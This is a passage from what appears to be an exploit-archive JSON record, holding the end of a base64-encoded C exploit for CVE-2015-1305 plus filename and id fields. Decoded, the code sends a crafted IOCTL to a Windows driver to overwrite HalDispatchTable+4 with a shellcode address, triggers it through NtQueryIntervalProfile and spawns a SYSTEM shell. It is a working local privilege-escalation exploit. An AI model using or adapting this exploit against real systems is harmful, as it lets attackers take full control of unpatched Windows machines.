RUFEIHwgRklMRV9TSEFSRV9XUklURSwgTlVMTCwgT1BFTl9FWElTVElORyAsIDAsIE5VTEwpOw0KICAgIA0KICAgIGlmIChoRGV2aWNlID09IElOVkFMSURfSEFORExFX1ZBTFVFKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gQ3JlYXRlRmlsZSBvcGVuICVzIGRldmljZSBmYWlsZWQgKCVkKVxuXG4iLCBkZXZoYW5kbGUsIEdldExhc3RFcnJvcigpKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICBlbHNlIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbK10gT3BlbiAlcyBkZXZpY2Ugc3VjY2Vzc2Z1bFxuIiwgZGV2aGFuZGxlKTsNCiAgICB9DQoNCiAgICBIYWxEaXNwYXRjaFRhYmxlVGFyZ2V0ID0gSGFsRGlzcGF0Y2hUYWJsZUFkZHJlc3MoKSArIHNpemVvZihEV09SRCk7DQogICAgcHJpbnRmKCJbK10gSGFsRGlzcGF0Y2hUYWJsZSs0ICgweCUwOHgpIHdpbGwgYmUgb3ZlcndyaXR0ZW5cbiIsIEhhbERpc3BhdGNoVGFibGVUYXJnZXQpOw0KDQogICAgaW5wdXRbMF0gPSBhZGRydG9zaGVsbDsgIC8vIGlucHV0IGJ1ZmZlciBjb250ZW50cyBnZXRzIHdyaXR0ZW4gdG8gb3VyIG91dHB1dCBidWZmZXIgYWRkcmVzcw0KICAgICAgICAgICAgICAgICAgICANCiAgICBwcmludGYoIlsrXSBJbnB1dCBidWZmZXIgY29udGVudHMgJTA4eFxuIiwgaW5wdXRbMF0pOw0KIAkNCiAgICBwcmludGYoIlt+XSBQcmVzcyBhbnkga2V5IHRvIHNlbmQgRXhwbG9pdCAgLiAuIC5cbiIpOw0KICAgIGdldGNoKCk7DQoNCiAgICBEZXZpY2VJb0NvbnRyb2woaERldmljZSwgMHgwMDIyNDAxNCwgaW5wdXQsIHNpemVvZihpbnB1dCksIChMUFZPSUQpSGFsRGlzcGF0Y2hUYWJsZVRhcmdldCwgMCwgJmR3UmV0Qnl0ZXMsIE5VTEwpOw0KDQogICAgcHJpbnRmKCJbK10gQnVmZmVyIHNlbnRcbiIpOw0KICAgIENsb3NlSGFuZGxlKGhEZXZpY2UpOw0KDQogICAgcHJpbnRmKCJbK10gU3Bhd25pbmcgU1lTVEVNIFNoZWxsXG4iKTsNCiAgICBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlKDIsICZ0aW1lKTsNCiAgICBzcGF3blNoZWxsKCk7DQoNCiAgICByZXR1cm4gMDsNCn0=", 
    "filename": "platforms/windows/local/35953.c", 
    "id": "35953", 
    "cves": [
        "CVE-2015-1305"
    ]
}